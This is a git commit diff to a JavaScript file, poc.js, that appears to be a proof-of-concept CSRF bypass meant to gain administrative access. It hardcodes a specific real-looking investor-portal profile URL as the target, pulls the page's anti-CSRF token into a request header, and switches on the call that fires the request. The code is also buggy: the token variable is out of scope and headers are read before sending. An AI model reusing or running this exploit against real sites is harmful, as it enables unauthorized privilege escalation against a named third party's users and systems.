477f240cbcb3d7d2d0bd56bc96c2f2d07b0748d1
ret2eax <magicsbro@gmail.com>
2021-03-02 13:08:54 +0800

    Update poc.js

--- poc.js
+++ poc.js
@@ -3,12 +3,14 @@ console.log("Initiating exploit...");
 //console.log("GET URL is: " + GET_URL);
 //console.log("might need to put the entire https:// URL here if this fails..");
 
+var priveEscTarget = "https://investorportal.ispt.net.au/my-profile"; //be sure to change this when making POST
+console.log("Targetting: " + priveEscTarget);
 
 function readToken() {
   console.log("Reading response to extract anti-CSRF token...");
   var extract = document.querySelector('input[name=_token]').value;
   console.log("Token extracted successfully: " + extract);
-  console.log();
+  console.log(" ");
 
 }
 
@@ -17,44 +19,23 @@ function bypassCSRF() {
   //instantiating XMLHttpRequest
   var poc = new XMLHttpRequest();
   console.log("Assigning payload...");
-  poc.open("GET","http://some.url"); //need to add the POST CSRF req here associtaed with user role access, with http post body data included.
+  poc.open("GET", priveEscTarget); //need to add the POST CSRF req here associtaed with user role access, with http post body data included.
   console.log("Parsing token to XHR to bypass CSRF protection mechanism...");
   poc.setRequestHeader("X-CSRF-TOKEN", extract);
   console.log("Firing exploit...");
+  //below is for debugging, can be deleted
+  console.log("Debugging if X-CSRF-TOKEN header is submitted: ");
+  var headers = poc.getAllResponseHeaders();
+  console.log(headers);
+  // end of debugging
   poc.send();
   console.log("Exploit completed! You should now have Administrative access!");
-  console.log();
+  console.log(" ");
 }
 
 readToken();
-// bypassCSRF();
+bypassCSRF();
 
-function getTokenJS() {
-    var xhr = new XMLHttpRequest();
-    // This tels it to return it as a HTML document
-    xhr.responseType = "document";
-    // true on the end of here makes the call asynchronous
-    console.log("making the call..");
-    xhr.open("GET", GET_URL, true);
-    console.log("reading response...");
-    xhr.onload = function (e) {
-        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
-            // Get the document from the response
-            page = xhr.response;
-            // Get the input element
-            console.log("extracting token value");
-            console.log("this may be problematic if so, likely assigned the wrong input element...");
-            var input = document.querySelector('input[name=_token]').value;
-            // Show the token
-            console.log("aaaand:");
-            console.log("The token is: " + input.value);
-            // Use the token to submit the form
-            //submitFormWithTokenJS(input.value);
-        }
-    };
-    // Make the request
-    //xhr.send(null);
-}
 //console.log("Done! Verify extracted token value is correct, if so; write xhr function to fire the privesc");
 //var GET_URL="https://investorportal.ispt.net.au/my-profile";
 //getTokenJS();
